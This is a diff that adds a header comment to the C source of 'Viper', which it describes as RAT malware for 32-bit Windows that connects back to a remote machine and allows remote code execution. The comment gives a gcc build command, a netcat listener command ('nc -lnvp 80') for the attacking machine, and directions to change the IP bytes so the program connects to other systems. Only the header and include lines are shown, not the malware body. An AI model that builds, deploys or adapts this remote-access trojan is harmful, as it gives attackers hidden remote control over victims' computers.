@@ -1,3 +1,17 @@
+/*
+*	Name: Viper
+*	Authored by: http://www.neehack.com/
+*
+*	This program is distributed for ethical purposes only.
+*
+*	Guide: This is a RAT based malware that connects to a remote system and allows remote code execution.
+*	The malware is developed under windows 32bit architecture.
+*	To test it, you can:
+* 	1. Compoile the code using gcc as following: `gcc -g -fno-stack-protector -m32 viper.c -o viper.exe -l ws2_32`
+* 	2. Start a listener using Any/nc as following in your attacking machine: `nc -lnvp 80`
+*	3. Execute viper in localhost(change IP bytes in the malware to connect to other attacking systems) `viper.exe`
+*/
+
 #include <winsock2.h>
 #include <windows.h>
 #include <ws2tcpip.h>
